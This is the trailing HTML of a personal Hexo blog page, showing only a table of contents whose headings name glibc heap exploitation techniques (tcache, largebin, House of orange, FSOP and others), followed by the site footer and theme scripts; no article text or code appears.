        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#UAF"><span class="nav-text">UAF</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#fastbin"><span class="nav-text">fastbin</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#tcache"><span class="nav-text">tcache</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Unlink"><span class="nav-text">Unlink</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Unsorted-bin-attack"><span class="nav-text">Unsorted bin attack</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Largebin-attack"><span class="nav-text">Largebin attack</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#libc-2-29%E5%8F%8A%E4%BB%A5%E5%89%8D"><span class="nav-text">libc-2.29及以前</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#libc-2-30%E4%BB%A5%E5%90%8E"><span class="nav-text">libc-2.30以后</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Tcache-stashing-unlink-attack"><span class="nav-text">Tcache_stashing_unlink_attack</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E6%9D%A1%E4%BB%B6"><span class="nav-text">攻击条件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E6%95%88%E6%9E%9C"><span class="nav-text">攻击效果</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95"><span class="nav-text">攻击方法</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AE%80%E5%8D%95POC"><span class="nav-text">简单POC</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#PLUS"><span class="nav-text">PLUS</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#House-of-einherjar"><span class="nav-text">House of einherjar</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#IO-FILE-attack"><span class="nav-text">IO_FILE attack</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#IO%E7%BB%93%E6%9E%84%E4%BD%93"><span class="nav-text">IO结构体</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#FSOP"><span class="nav-text">FSOP</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#libc-2-24%E4%B8%8B%E7%9A%84%E6%94%BB%E5%87%BB"><span class="nav-text">libc-2.24下的攻击</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#House-of-botcake"><span class="nav-text">House of botcake</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#House-of-orange"><span class="nav-text">House of orange</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#House-of-corrosion"><span class="nav-text">House of corrosion</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E6%9D%A1%E4%BB%B6-1"><span class="nav-text">攻击条件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E6%95%88%E6%9E%9C-1"><span class="nav-text">攻击效果</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95-1"><span class="nav-text">攻击方法</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AE%80%E5%8D%95POC-1"><span class="nav-text">简单POC</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#House-of-banana"><span class="nav-text">House of banana</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#House-of-cat"><span class="nav-text">House of cat</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#FSOP%E8%A7%A6%E5%8F%91"><span class="nav-text">FSOP触发</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#malloc-assert%E8%A7%A6%E5%8F%91"><span class="nav-text">__malloc_assert触发</span></a></li></ol></li></ol>

    </div>
</div>
        </div>
    
</div>



                

            </div>

            

        </div>

        <div class="main-content-footer">
            <footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
    <div class="info-container py-3 text-center">
        
        <div class="text-center">
            &copy;
            
              <span>2022</span>
              -
            
            2024&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">Static</a>
        </div>
        
            <script data-swup-reload-script src="https://cn.vercount.one/js"></script>
            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
                
                    <span id="busuanzi_container_site_uv" class="lg:!block">
                        <span class="text-sm">VISITOR COUNT</span>
                        <span id="busuanzi_value_site_uv"></span>
                    </span>
                
                
                    <span id="busuanzi_container_site_pv" class="lg:!block">
                        <span class="text-sm">TOTAL PAGE VIEWS</span>
                        <span id="busuanzi_value_site_pv"></span>
                    </span>
                
            </div>
        
        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.6.0</a></span>
        </div>
        
        
            <div>
                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
            </div>
        
        
            <script data-swup-reload-script>
                try {
                    function odometer_init() {
                    const elements = document.querySelectorAll('.odometer');
                    elements.forEach(el => {
                        new Odometer({
                            el,
                            format: '( ddd).dd',
                            duration: 200
                        });
                    });
                    }
                    odometer_init();
                } catch (error) {}
            </script>
        
        
        
    </div>  
</footer>
        </div>
    </div>

    
        <div class="post-tools">
            <div class="post-tools-container">
    <ul class="article-tools-list">
        <!-- TOC aside toggle -->
        
            <li class="right-bottom-tools page-aside-toggle">
                <i class="fa-regular fa-outdent"></i>
            </li>
        

        <!-- go comment -->
        
            <li class="go-comment">
                <i class="fa-regular fa-comments"></i>
            </li>
        
    </ul>
</div>

        </div>
    

    <div class="right-side-tools-container">
        <div class="side-tools-container">
    <ul class="hidden-tools-list">
        <li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
            <i class="fa-regular fa-magnifying-glass-plus"></i>
        </li>

        <li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
            <i class="fa-regular fa-magnifying-glass-minus"></i>
        </li>

        <li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
            <i class="fa-regular fa-moon"></i>
        </li>

        <!-- rss -->
        

        

        <li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
            <i class="fa-regular fa-arrow-down"></i>
        </li>
    </ul>

    <ul class="visible-tools-list">
        <li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
            <i class="fa-regular fa-cog fa-spin"></i>
        </li>
        
            <li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
                <i class="arrow-up fas fa-arrow-up"></i>
                <span class="percent"></span>
            </li>
        
        
    </ul>
</div>

    </div>

    <div class="image-viewer-container">
    <img src="">
</div>


    

</main>


    
<script src="/js/libs/Swup.min.js"></script>

<script src="/js/libs/SwupSlideTheme.min.js"></script>

<script src="/js/libs/SwupScriptsPlugin.min.js"></script>

<script src="/js/libs/SwupProgressPlugin.min.js"></script>

<script src="/js/libs/SwupScrollPlugin.min.js"></script>

<script src="/js/libs/SwupPreloadPlugin.min.js"></script>

<script>
    const swup = new Swup({
        plugins: [
            new SwupScriptsPlugin({
                optin: true,
            }),
            new SwupProgressPlugin(),
            new SwupScrollPlugin({
                offset: 80,
            }),
            new SwupSlideTheme({
                mainElement: ".main-content-body",
            }),
            new SwupPreloadPlugin(),
        ],
        containers: ["#swup"],
    });
</script>







<script src="/js/tools/imageViewer.js" type="module"></script>

<script src="/js/utils.js" type="module"></script>

<script src="/js/main.js" type="module"></script>

<script src="/js/layouts/navbarShrink.js" type="module"></script>

<script src="/js/tools/scrollTopBottom.js" type="module"></script>

<script src="/js/tools/lightDarkSwitch.js" type="module"></script>

<script src="/js/layouts/categoryList.js" type="module"></script>





    
<script src="/js/tools/codeBlock.js" type="module"></script>




    
<script src="/js/layouts/lazyload.js" type="module"></script>




    
<script src="/js/tools/runtime.js"></script>

    
<script src="/js/libs/odometer.min.js"></script>

    
<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">




  
<script src="/js/libs/Typed.min.js"></script>

  
<script src="/js/plugins/typed.js" type="module"></script>









<div class="post-scripts" data-swup-reload-script>
    
        
<script src="/js/tools/tocToggle.js" type="module"></script>

<script src="/js/layouts/toc.js" type="module"></script>

<script src="/js/plugins/tabs.js" type="module"></script>

    
</div>


</body>
</html>
